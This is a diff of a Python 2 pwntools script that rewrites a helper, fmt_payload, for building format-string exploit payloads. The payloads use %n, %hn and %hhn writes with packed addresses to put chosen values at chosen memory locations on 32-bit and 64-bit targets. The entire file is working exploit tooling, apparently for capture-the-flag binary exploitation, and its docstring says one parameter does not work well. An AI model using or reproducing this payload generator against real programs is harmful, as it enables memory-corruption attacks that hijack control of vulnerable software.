@@ -1,32 +1,63 @@
 from pwn import *
 
-def fmt64_payload(offset,address,value,n,written=0):
+def fmt_payload(offset,address,value,n=0,written=0,arch='amd64',typex='byte'):
+    '''
+        offset is the deviation you found
+        address is the target you want to write
+        value is the value you want to write
+        n is how many you want to write
+        written doesn't work well,don't use it now.
+        arch is the arch of the program , 32 or 64
+        type is which way you want to use.
+    '''
+    config = {
+        'i386' : {
+            'byte': (4, 1, 0xFF, 'hh', 8),
+            'short': (2, 2, 0xFFFF, 'h', 16),
+            'int': (1, 4, 0xFFFFFFFF, '', 32)},
+        'amd64' : {
+            'byte': (8, 1, 0xFF, 'hh', 8),
+            'short': (4, 2, 0xFFFF, 'h', 16),
+            'int': (2, 4, 0xFFFFFFFF, '', 32)
+        }
+    }
     assert(type(value)==int)
+    if(value > int('F'*(2*config[arch]['byte'][0]),16)):
+        print "Value is too large!"
+        exit()
+    if n == 0:
+        n = config[arch][typex][0]
     payload = []
     dicts = []
     slen = 0
     soffset = offset
     for i in range(n):
-        sbyte = value>>(i<<3)&0xff
-        saddress = address+i
+        sbyte = value>>(i*config[arch][typex][4])&config[arch][typex][2]
+        saddress = address+i*config[arch][typex][1]
         dicts.append({'address':saddress,'byte':sbyte})
     dicts = sorted(dicts,key=lambda i:i['byte'])
-    tmp = "%{byte}c%{soffset}$n"
     now = 0
     for i in dicts:
-        spayload = tmp.format(byte=str(i['byte']-now).rjust(3,'0'),soffset = '{soffset}')
+        if i['byte'] == now:
+            spayload = "%{soffset}$"+config[arch][typex][3]+"n"
+        else:
+            spayload = ("%{byte}c%{soffset}$"+config[arch][typex][3]+"n").format(byte=str(i['byte']-now),soffset = '{soffset}')
         now = i['byte']
-        slen += 10
+        slen += len(spayload) - len('soffset')
         payload.append(spayload)
-    padlen = 0 if slen%8 == 0 else 8-slen%8
+    padlen = 0 if slen%config[arch]['byte'][0] == 0 else config[arch]['byte'][0]-slen%config[arch]['byte'][0]
     slen += padlen
-    soffset += slen/8
+    soffset += slen/config[arch]['byte'][0]
     payload.append('A'*padlen)
     for i in dicts:
-        payload.append(p64(i['address']))
+        if arch == 'amd64':
+            payload.append(p64(i['address']))
+        if arch == 'i386':
+            payload.append(p32(i['address']))
     for i in range(n):
         payload[i] = payload[i].format(soffset=soffset)
         soffset += 1
     return ''.join(payload)
 
-print fmt64_payload(6,0x08102030,0x7f1212567890,8)
+if __name__ == "__main__":
+    pass
